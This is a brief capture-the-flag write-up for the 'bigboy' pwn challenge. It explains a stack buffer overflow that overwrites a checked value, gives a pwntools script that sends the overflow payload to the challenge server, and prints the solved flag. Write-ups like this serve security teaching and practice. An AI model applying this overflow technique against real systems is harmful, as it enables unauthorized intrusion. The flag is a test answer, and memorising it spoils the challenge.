## bigboy 50 (pwn)

### Solution

There's a buffer overflow on stack, just overwrite `0xDEADBEEF(buf + 0x14)` to `0xCAF3BAEE` to bypass the check.

### Exploit

```python
#!/usr/bin/env python3
from pwn import *
context(arch="amd64")

r = remote("pwn.chal.csaw.io", 9000)
r.send(b"a"*0x14 + p32(0xCAF3BAEE))
r.interactive()
```
### Flag

```
flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
```
